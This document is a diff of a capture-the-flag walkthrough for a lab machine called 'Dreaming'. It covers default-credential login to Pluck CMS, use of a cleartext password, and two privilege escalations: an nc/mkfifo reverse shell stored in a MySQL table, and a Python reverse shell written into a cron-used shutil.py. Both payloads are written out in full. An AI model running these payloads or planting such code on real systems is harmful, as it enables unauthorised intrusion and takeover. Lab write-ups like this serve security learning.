@@ -49,7 +49,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
 ```
  
-HTTP server is only the default Apache page. Let's find some directories. My default is feroxbuster but gobuster or fuff are also good.
+HTTP server is only the default Apache page. Let's find some directories. My default is feroxbuster but gobuster, fuff, and wfuzz are also good.
 ```
 feroxbuster -u http://10.10.116.166
 
@@ -82,7 +82,7 @@ by Ben "epi" Risher 🤓                 ver: 2.10.1
 [####################] - 0s     30000/30000   138889/s http://10.10.116.166/app/ => Directory listing
 ```
  
-There is `/app` which then has `/pluck-4.7.13`. The site has two links at the bottom. Another is to `www.pluck-cms.org` which redirects to the GitHub page of Pluck CMS and the other to an admin login page.  
+There is `/app` which then has `/pluck-4.7.13`. The site has two links at the bottom. Another is to `www.pluck-cms.org` which redirects to the GitHub page of Pluck CMS and the other link is to an admin login page.  
 The Login page only requires a password so I tried the most obvious one and got in. The password was the documented default one.  
 The pluck CMS version is 4.7.13 so I searched vulnerabilities for in that version from searchsploit.  
 ```
@@ -119,9 +119,9 @@ stty raw -echo && fg
 ```
  
 I could not find anything of interest in the directories I landed to and then went to look in the home folders of the other users.  
-There was nothing of interest in the `/home/lucien` folder that I could read. In the `/opt` directory on the other hand were two files that I could read.  
-The file owned by lucien has a cleartext password that lets me SSH into the machine or optionally just use `su lucien`.   
-Now we can read the `lucien_flag.txt`
+There was nothing of interest in the `/home/lucien` folder that I could read. In the `/opt` directory on the other hand were two files of interest.  
+The file owned by `lucien` has a cleartext password that lets me SSH into the machine or optionally just use `su lucien`.   
+Now we can read the `/home/lucien/lucien_flag.txt`
 
 Having the password of the user I want to see if the user can run commands as root or as another user.  
 ```
@@ -164,7 +164,7 @@ It works so then we can try to input code into the MySQL database and see if the
 `Insert into dreams (dreamer,dream) values ("test1","test2");` we can test that we can input into the columns. Use `select * from dreams;` again to check that the data was successfully inserted into the table.   
 `insert into dreams (dreamer,dream) values ("pwned","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <your_ip> <listening_port> >/tmp/f");` to insert our reverse shell to the table.   
 
-Again starting an ncat listener for the port specified in the reverse shell. Then I can execute the python script as `death`.  
+Again starting an ncat listener for the port specified in the reverse shell. Then I can execute the Python script as `death`.  
 ```
 sudo -u death /usr/bin/python3 /home/death/getDreams.py
 Alice + Flying in the sky
@@ -188,7 +188,7 @@ death@dreaming:/home/lucien$
 ```
 
 Now I'm in as `death` and have access to `/home/death/death_flag.txt`. I also checked the `/home/death/getDreams.py` for the MySQL password and then checked if the password is valid for the user account(it is).  
-I could not find anything other interesting in `death`s folder and then headed to `morpheus`s folder.  
+I could not find anything other interesting in `death`'s folder and then headed to `morpheus`'s folder.  
 There is a Python script that backups `/home/morpheus/kingdom` to `/kingdom_backup/kingdom` and it uses `copy2` from `shutil` to do that.  
 
 I checked if the script was in a cronjob somewhere with the program called `pspy` that I uploaded to the machine.  
@@ -206,12 +206,27 @@ The script seems to execute every minute.
 shutil.py is found at `/usr/lib/python3.8/` and we seem to have permission to write to it.  
 ```
 ls -la /usr/lib/python3.8/shutil.py
--rw-rw-r-- 1 root death 51474 Aug  7 23:52 /usr/lib/python3.8/shutil.py
+-rw-rw-r-- 1 root death 51474 Jan  4 13:11 /usr/lib/python3.8/shutil.py
 ```
 
+So there is a cronjob that executes every minute and it uses `/usr/lib/python3.8/shutil.py` and we have rights to write into it.   
+Let's put a reverse shell into the `shutil.py`!   
+First I searched for where the `copy2` is defined. I then added a Python reverse shell above the line `if os.path.isdir(dst):`   
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<listening_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+```
 
+After a minute I got my shell as the user `morpheus`. I could then read the flag `/home/morpheus/morpheus_flag.txt`.   
+I also now have rights as root.   
+```
+sudo -l
+Matching Defaults entries for morpheus on dreaming:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-
+User morpheus may run the following commands on dreaming:
+    (ALL) NOPASSWD: ALL
+```
 
 
 
